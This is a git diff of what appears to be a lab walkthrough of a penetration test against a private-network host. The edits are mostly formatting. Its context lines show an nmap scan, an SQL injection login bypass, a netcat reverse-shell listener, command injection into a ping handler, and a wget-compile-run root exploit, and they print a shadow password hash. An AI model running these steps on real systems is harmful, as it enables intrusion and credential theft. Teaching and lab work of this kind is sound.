@@ -23,6 +23,7 @@ nmap -sV 192.168.0.24
 
 <!-- 🖼️ PLACE FIRST IMAGE HERE -->
 ![Nmap Scan Results](images/nmap_scan_lvl2.png)
+
 *Figure 1: Service identification highlighting active web and database components.*
 
 ---
@@ -38,6 +39,7 @@ admin' OR '1'='1
 
 <!-- 🖼️ PLACE SECOND IMAGE HERE -->
 ![SQL Injection Interface](images/sql_command_lvl2.png)
+
 *Figure 2: SQL Injection input tracking alignment.*
 
 *Note: The password field parameter was left completely blank.*
@@ -56,6 +58,7 @@ nc -lvnp 4444
 
 <!-- 🖼️ PLACE THIRD IMAGE HERE -->
 ![Setting up Listener](images/foothold_lvl2.png)
+
 *Figure 3: Setting up the Netcat listener to catch the interactive shell session.*
 
 ---
@@ -67,6 +70,7 @@ nc -lvnp 4444
 
 <!-- 🖼️ PLACE FOURTH IMAGE HERE -->
 ![Command Injection Target Trigger](images/sql_command2_lvl2.png)
+
 *Figure 4: Delivering the unified logical payload to the backend ping handler.*
 
 **Result:** The web server executed the background task and sent back an interactive reverse shell session to the listener terminal as low-privilege web execution profile `apache`.
@@ -96,7 +100,7 @@ The exploit module was staged inside the Kali environment, served over an unencr
 ```bash
 # On Target Environment Shell
 cd /tmp
-wget http://192.168.0
+wget http://192.168.0.21
 gcc -o rootme exploit.c
 ./rootme
 ```
@@ -121,6 +125,7 @@ harold:\$1\$7d.sVxgm\$3MYWsHDv0F/LP.mjL9lp/1:14529:0:99999:7:::
 
 <!-- 🖼️ PLACE FIFTH IMAGE HERE -->
 ![Privilege Escalation to Root](images/root_escalation_lvl2.png)
+
 *Figure 5: Exposing administrative shadow configurations via the root context.*
 
 ---
